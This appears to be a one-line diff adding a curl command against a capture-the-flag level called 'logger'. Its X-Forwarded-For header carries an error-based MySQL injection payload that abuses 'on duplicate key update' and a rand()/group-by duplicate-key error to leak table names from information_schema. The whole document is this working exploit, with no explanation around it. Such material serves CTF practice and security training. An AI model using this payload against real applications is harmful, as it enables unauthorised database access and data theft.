@@ -1,0 +1,1 @@
+curl http://ctf.s/levels/logger/\?id\=asd -D - --header "X-Forwarded-For: 100.200.') on duplicate key update a=(select 1 from(select count(*),concat((select table_name from information_schema.tables where table_schema='ctf_level_logger' limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)-- a"
